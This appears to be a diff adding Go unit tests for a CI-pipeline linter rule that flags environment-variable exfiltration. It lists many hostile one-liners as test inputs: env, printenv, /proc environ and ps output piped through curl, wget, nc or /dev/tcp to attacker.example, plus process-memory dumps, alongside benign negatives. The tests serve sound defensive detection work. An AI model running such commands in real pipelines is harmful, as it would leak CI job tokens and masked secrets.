@@ -283,3 +283,54 @@ job:
 		t.Fatalf("expected no finding when source and sink are on different lines, got %d", len(f))
 	}
 }
+
+func TestGL083_EnvironmentExfiltration(t *testing.T) {
+	cases := []struct {
+		line string
+		want finding.Severity // "" = no finding
+	}{
+		{`env | curl -d @- https://attacker.example`, finding.Error},
+		{`printenv | base64 | curl -X POST --data-binary @- https://attacker.example/x`, finding.Error},
+		{`curl -d "$(env | base64)" https://attacker.example`, finding.Error},
+		{"wget --post-data=\"`printenv`\" https://attacker.example", finding.Error},
+		{`cat /proc/*/environ | base64 | curl -d @- https://attacker.example`, finding.Error},
+		{`cat /proc/1/environ | nc attacker.example 4444`, finding.Error},
+		{`ps auxeww | nc attacker.example 4444`, finding.Error},
+		{`env > /dev/tcp/attacker.example/4444`, finding.Error},
+		{`curl -d "$(cat /proc/$(pgrep -f Runner.Worker)/environ)" https://attacker.example`, finding.Error},
+		{`cat /proc/$PID/mem > /tmp/m`, finding.Warn},
+		{`dd if=/proc/1/mem of=/tmp/dump bs=1M`, finding.Warn},
+		// routine
+		{`env | grep CI_ | sort`, ""},
+		{`env > build.env`, ""},
+		{`printenv | sort > vars.txt`, ""},
+		{`curl -H "Authorization: Bearer $(printenv API_TOKEN)" https://api.example.com`, ""},
+		{`env FOO=1 curl -d @payload.json https://api.example.com`, ""},
+		{`ps -ef | grep nginx`, ""},
+		{`docker compose ps redis | nc -q1 monitor.internal 9000`, ""},
+		{`sudo ps eww | curl -T - https://attacker.example`, finding.Error},
+		{`ps aux | nc -z db 5432`, ""},
+		{`cat /proc/meminfo`, ""},
+		{`cat /proc/self/status | grep VmRSS`, ""},
+		{`curl -d "$(date)" https://api.example.com`, ""},
+		{`echo "$(env | wc -l) variables"`, ""},
+	}
+	for _, tc := range cases {
+		f := findings083(t, "job:\n  script:\n    - '"+strings.ReplaceAll(tc.line, "'", "''")+"'\n")
+		switch {
+		case tc.want == "" && len(f) != 0:
+			t.Errorf("%s: expected no finding, got %q", tc.line, f[0].Message)
+		case tc.want != "" && len(f) != 1:
+			t.Errorf("%s: expected 1 finding, got %d", tc.line, len(f))
+		case tc.want != "" && f[0].Severity != tc.want:
+			t.Errorf("%s: severity %s, want %s", tc.line, f[0].Severity, tc.want)
+		}
+	}
+}
+
+func TestGL083_EnvironmentMessage(t *testing.T) {
+	f := findings083(t, "job:\n  script:\n    - env | curl --data-binary @- https://ci.example.org/hook\n")
+	if len(f) != 1 || !strings.Contains(f[0].Message, "CI_JOB_TOKEN and every masked variable") {
+		t.Errorf("expected the environment message, got %+v", f)
+	}
+}
